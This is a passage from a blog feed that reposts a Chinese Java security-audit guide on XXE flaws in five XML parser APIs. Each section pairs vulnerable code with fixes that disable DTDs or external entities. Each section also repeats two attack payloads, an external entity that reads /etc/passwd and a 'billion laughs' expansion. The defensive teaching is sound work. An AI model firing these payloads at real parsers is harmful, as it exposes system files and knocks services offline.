(CVE-2013-5679)</a><br><a href="http://nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-5679" target="_blank" rel="noopener">Vulnerability Summary for CVE-2013-5679</a><br><a href="http://www.synacktiv.com/ressources/synacktiv_owasp_esapi_hmac_bypass.pdf" target="_blank" rel="noopener">Synactiv: Bypassing HMAC validation in OWASP ESAPI symmetric encryption</a><br><a href="http://cwe.mitre.org/data/definitions/310.html" target="_blank" rel="noopener">CWE-310: Cryptographic Issues</a><br><a href="http://lists.owasp.org/pipermail/esapi-dev/2015-March/002533.html" target="_blank" rel="noopener">ESAPI-dev mailing list: Status of CVE-2013-5960</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java审计-DAY3&quot;&gt;&lt;a href=&quot;#Java审计-DAY3&quot; class=&quot;headerlink&quot; title=&quot;Java审计-DAY3&quot;&gt;&lt;/a&gt;Java审计-DAY3&lt;/h1&gt;&lt;p&gt;转载自 &lt;a href=&quot;https://blog.csdn.net
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java审计-DAY2</title>
    <link href="http://bai-ren-1.github.io/2020/03/02/Java%E5%AE%A1%E8%AE%A1-DAY2/"/>
    <id>http://bai-ren-1.github.io/2020/03/02/Java%E5%AE%A1%E8%AE%A1-DAY2/</id>
    <published>2020-03-02T06:56:50.000Z</published>
    <updated>2020-03-03T03:41:33.133Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java审计-DAY2"><a href="#Java审计-DAY2" class="headerlink" title="Java审计-DAY2"></a>Java审计-DAY2</h1><p>本文转载自 <a href="https://blog.csdn.net/niexinming/article/details/84312701" target="_blank" rel="noopener">https://blog.csdn.net/niexinming/article/details/84312701</a> </p><h1 id="xml解析导致xxe漏洞"><a href="#xml解析导致xxe漏洞" class="headerlink" title="xml解析导致xxe漏洞"></a>xml解析导致xxe漏洞</h1><p>漏洞特征：XXE_XMLSTREAMREADER<br>当xml解析程序收到不信任的输入且如果xml解析程序支持外部实体解析的时候，那么造成xml实体解析攻击（xxe）<br>危害1：探测本地文件内容（xxe：xml 外部实体）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">   &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt; ]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>危害2：拒绝服务攻击 （xee：xml 外部实体膨胀）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line"> &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line"> &lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line"> &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">[...]</span><br><span class="line"> &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><p>解决方法：<br>为了避免解析xml带来的攻击，你应该按照下面的示例代码修改你的代码<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public void parseXML(InputStream input) throws XMLStreamException &#123;</span><br><span class="line"></span><br><span class="line">    XMLInputFactory factory = XMLInputFactory.newFactory();</span><br><span class="line">    XMLStreamReader reader = factory.createXMLStreamReader(input);</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>禁用外部实体的解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public void parseXML(InputStream input) throws XMLStreamException &#123;</span><br><span class="line"></span><br><span class="line">    XMLInputFactory factory = XMLInputFactory.newFactory();</span><br><span class="line">    factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);</span><br><span class="line">    XMLStreamReader reader = factory.createXMLStreamReader(input);</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>禁用DTD的方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public void parseXML(InputStream input) throws XMLStreamException &#123;</span><br><span class="line"></span><br><span class="line">    XMLInputFactory factory = XMLInputFactory.newFactory();</span><br><span class="line">    factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);</span><br><span class="line">    XMLStreamReader reader = factory.createXMLStreamReader(input);</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/611.html" target="_blank" rel="noopener">CWE-611: Improper Restriction of XML External Entity Reference (‘XXE’)</a><br><a href="https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=61702260" target="_blank" rel="noopener">CERT: IDS10-J. Prevent XML external entity attacks</a><br><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing" target="_blank" rel="noopener">OWASP.org: XML External Entity (XXE) Processing</a><br><a href="http://www.ws-attacks.org/index.php/XML_Entity_Expansion" target="_blank" rel="noopener">WS-Attacks.org: XML Entity Expansion</a><br><a href="http://www.ws-attacks.org/index.php/XML_External_Entity_DOS" target="_blank" rel="noopener">WS-Attacks.org: XML External Entity DOS</a><br><a href="http://www.ws-attacks.org/index.php/XML_Entity_Reference_Attack" target="_blank" rel="noopener">WS-Attacks.org: XML Entity Reference Attack</a><br><a href="http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html" target="_blank" rel="noopener">Identifying Xml eXternal Entity vulnerability (XXE)</a><br><a href="http://openjdk.java.net/jeps/185" target="_blank" rel="noopener">JEP 185: Restrict Fetching of External XML Resources</a></p><h1 id="xml解析导致xxe漏洞-XPathExpression"><a href="#xml解析导致xxe漏洞-XPathExpression" class="headerlink" title="xml解析导致xxe漏洞(XPathExpression)"></a>xml解析导致xxe漏洞(XPathExpression)</h1><p>漏洞特征：XXE_XPATH<br>当xml解析程序收到不信任的输入且如果xml解析程序支持外部实体解析的时候，那么造成xml实体解析攻击（xxe）<br>危害1：探测本地文件内容（xxe：xml 外部实体）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">   &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt; ]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>危害2：拒绝服务攻击 （xee：xml 外部实体膨胀）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line"> &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line"> &lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line"> &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">[...]</span><br><span class="line"> &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><p>解决方法：<br>为了避免解析xml带来的攻击，你应该按照下面的示例代码修改你的代码<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilder builder = df.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">XPathFactory xPathFactory = XPathFactory.newInstance();</span><br><span class="line">XPath xpath = xPathFactory.newXPath();</span><br><span class="line">XPathExpression xPathExpr = xpath.compile(&quot;/somepath/text()&quot;);</span><br><span class="line"></span><br><span class="line">xPathExpr.evaluate(new InputSource(inputStream));</span><br></pre></td></tr></table></figure><p>下面的两个片段展示了可能的解决方案。你可以设置其中一个，或者两个都设置</p><p>使用”Secure processing” 模式的解决方案</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory df = DocumentBuilderFactory.newInstance();</span><br><span class="line">df.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);</span><br><span class="line">DocumentBuilder builder = df.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">xPathExpr.evaluate( builder.parse(inputStream) );</span><br></pre></td></tr></table></figure><p>禁用DTD的解决方案：<br>通过禁用DTD，大多数的xxe攻击都可以被避免</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory df = DocumentBuilderFactory.newInstance();</span><br><span class="line">spf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">DocumentBuilder builder = df.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">xPathExpr.evaluate( builder.parse(inputStream) );</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/611.html" target="_blank" rel="noopener">CWE-611: Improper Restriction of XML External Entity Reference (‘XXE’)</a><br><a href="https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=61702260" target="_blank" rel="noopener">CERT: IDS10-J. Prevent XML external entity attacks</a><br><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing" target="_blank" rel="noopener">OWASP.org: XML External Entity (XXE) Processing</a><br><a href="http://www.ws-attacks.org/index.php/XML_Entity_Expansion" target="_blank" rel="noopener">WS-Attacks.org: XML Entity Expansion</a><br><a href="http://www.ws-attacks.org/index.php/XML_External_Entity_DOS" target="_blank" rel="noopener">WS-Attacks.org: XML External Entity DOS</a><br><a href="http://www.ws-attacks.org/index.php/XML_Entity_Reference_Attack" target="_blank" rel="noopener">WS-Attacks.org: XML Entity Reference Attack</a><br><a href="http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html" target="_blank" rel="noopener">Identifying Xml eXternal Entity vulnerability (XXE)</a><br><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#XPathExpression" target="_blank" rel="noopener">XML External Entity (XXE) Prevention Cheat Sheet</a></p><h1 id="xml解析导致xxe漏洞-SAXParser"><a href="#xml解析导致xxe漏洞-SAXParser" class="headerlink" title="xml解析导致xxe漏洞(SAXParser)"></a>xml解析导致xxe漏洞(SAXParser)</h1><p>漏洞特征：XXE_SAXPARSER<br>当xml解析程序收到不信任的输入且如果xml解析程序支持外部实体解析的时候，那么造成xml实体解析攻击（xxe）<br>危害1：探测本地文件内容（xxe：xml 外部实体）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">   &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt; ]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>危害2：拒绝服务攻击 （xee：xml 外部实体膨胀）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line"> &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line"> &lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line"> &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">[...]</span><br><span class="line"> &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><p>解决方法：<br>为了避免解析xml带来的攻击，你应该按照下面的示例代码修改你的代码<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SAXParser parser = SAXParserFactory.newInstance().newSAXParser();</span><br><span class="line"></span><br><span class="line">parser.parse(inputStream, customHandler);</span><br></pre></td></tr></table></figure><p>下面的两个片段展示了可能的解决方案。你可以使用其中一个，或者两个都使用</p><p><strong>使用”Secure processing” 模式的解决方案:</strong><br>这个设置能保护你能避免拒绝服务攻击和ssrf漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);</span><br><span class="line">SAXParser parser = spf.newSAXParser();</span><br><span class="line"></span><br><span class="line">parser.parse(inputStream, customHandler);</span><br></pre></td></tr></table></figure><p><strong>禁用DTD的解决方案:</strong><br>通过禁用DTD，大多数的xxe攻击都可以被避免</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">spf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">SAXParser parser = spf.newSAXParser();</span><br><span class="line"></span><br><span class="line">parser.parse(inputStream, customHandler);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/611.html" target="_blank" rel="noopener">CWE-611: Improper Restriction of XML External Entity Reference (‘XXE’)</a><br><a href="https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=61702260" target="_blank" rel="noopener">CERT: IDS10-J. Prevent XML external entity attacks</a><br><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing" target="_blank" rel="noopener">OWASP.org: XML External Entity (XXE) Processing</a><br><a href="http://www.ws-attacks.org/index.php/XML_Entity_Expansion" target="_blank" rel="noopener">WS-Attacks.org: XML Entity Expansion</a><br><a href="http://www.ws-attacks.org/index.php/XML_External_Entity_DOS" target="_blank" rel="noopener">WS-Attacks.org: XML External Entity DOS</a><br><a href="http://www.ws-attacks.org/index.php/XML_Entity_Reference_Attack" target="_blank" rel="noopener">WS-Attacks.org: XML Entity Reference Attack</a><br><a href="http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html" target="_blank" rel="noopener">Identifying Xml eXternal Entity vulnerability (XXE)</a><br><a href="http://xerces.apache.org/xerces-j/features.html" target="_blank" rel="noopener">Xerces complete features list</a></p><h1 id="xml解析导致xxe漏洞-XMLReader"><a href="#xml解析导致xxe漏洞-XMLReader" class="headerlink" title="xml解析导致xxe漏洞(XMLReader)"></a>xml解析导致xxe漏洞(XMLReader)</h1><p>漏洞特征：XXE_XMLREADER<br>当xml解析程序收到不信任的输入且如果xml解析程序支持外部实体解析的时候，那么造成xml实体解析攻击（xxe）<br>危害1：探测本地文件内容（xxe：xml 外部实体）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">   &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt; ]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>危害2：拒绝服务攻击 （xee：xml 外部实体膨胀）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line"> &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line"> &lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line"> &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">[...]</span><br><span class="line"> &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><p>解决方法：<br>为了避免解析xml带来的攻击，你应该按照下面的示例代码修改你的代码<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XMLReader reader = XMLReaderFactory.createXMLReader();</span><br><span class="line">reader.setContentHandler(customHandler);</span><br><span class="line">reader.parse(new InputSource(inputStream));</span><br></pre></td></tr></table></figure><p>下面的两个片段展示了可能的解决方案。你可以使用其中一个，或者两个都使用</p><p><strong>使用”Secure processing” 模式的解决方案:</strong><br>这个设置能保护你能避免拒绝服务攻击和ssrf漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XMLReader reader = XMLReaderFactory.createXMLReader();</span><br><span class="line">reader.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);</span><br><span class="line">reader.setContentHandler(customHandler);</span><br><span class="line"></span><br><span class="line">reader.parse(new InputSource(inputStream));</span><br></pre></td></tr></table></figure><p><strong>禁用DTD的解决方案:</strong><br>通过禁用DTD，大多数的xxe攻击都可以被避免</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XMLReader reader = XMLReaderFactory.createXMLReader();</span><br><span class="line">reader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">reader.setContentHandler(customHandler);</span><br><span class="line"></span><br><span class="line">reader.parse(new InputSource(inputStream));</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/611.html" target="_blank" rel="noopener">CWE-611: Improper Restriction of XML External Entity Reference (‘XXE’)</a><br><a href="https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=61702260" target="_blank" rel="noopener">CERT: IDS10-J. Prevent XML external entity attacks</a><br><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing" target="_blank" rel="noopener">OWASP.org: XML External Entity (XXE) Processing</a><br><a href="http://www.ws-attacks.org/index.php/XML_Entity_Expansion" target="_blank" rel="noopener">WS-Attacks.org: XML Entity Expansion</a><br><a href="http://www.ws-attacks.org/index.php/XML_External_Entity_DOS" target="_blank" rel="noopener">WS-Attacks.org: XML External Entity DOS</a><br><a href="http://www.ws-attacks.org/index.php/XML_Entity_Reference_Attack" target="_blank" rel="noopener">WS-Attacks.org: XML Entity Reference Attack</a><br><a href="http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html" target="_blank" rel="noopener">Identifying Xml eXternal Entity vulnerability (XXE)</a><br><a href="http://xerces.apache.org/xerces-j/features.html" target="_blank" rel="noopener">Xerces complete features list</a></p><h1 id="xml解析导致xxe漏洞-DocumentBuilder"><a href="#xml解析导致xxe漏洞-DocumentBuilder" class="headerlink" title="xml解析导致xxe漏洞(DocumentBuilder)"></a>xml解析导致xxe漏洞(DocumentBuilder)</h1><p>漏洞特征：XXE_DOCUMENT<br>当xml解析程序收到不信任的输入且如果xml解析程序支持外部实体解析的时候，那么造成xml实体解析攻击（xxe）<br>危害1：探测本地文件内容（xxe：xml 外部实体）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">   &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt; ]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>危害2：拒绝服务攻击 （xee：xml 外部实体膨胀）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line"> &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line"> &lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line"> &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">[...]</span><br><span class="line"> &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><p>解决方法：<br>为了避免解析xml带来的攻击，你应该按照下面的示例代码修改你的代码<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilder db = DocumentBuilderFactory.newInstance().newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">Document doc = db.parse(input);</span><br></pre></td></tr></table></figure><p>下面的两个片段展示了可能的解决方案。你可以使用其中一个，或者两个都使用</p><p><strong>使用”Secure processing” 模式的解决方案:</strong><br>这个设置能保护你能避免拒绝服务攻击和ssrf漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);</span><br><span class="line">DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">Document doc = db.parse(input);</span><br></pre></td></tr></table></figure><p><strong>禁用DTD的解决方案:</strong><br>通过禁用DTD，大多数的xxe攻击都可以被避免</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">Document doc = db.parse(input);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/611.html" target="_blank" rel="noopener">CWE-611: Improper Restriction of XML External Entity Reference (‘XXE’)</a><br><a 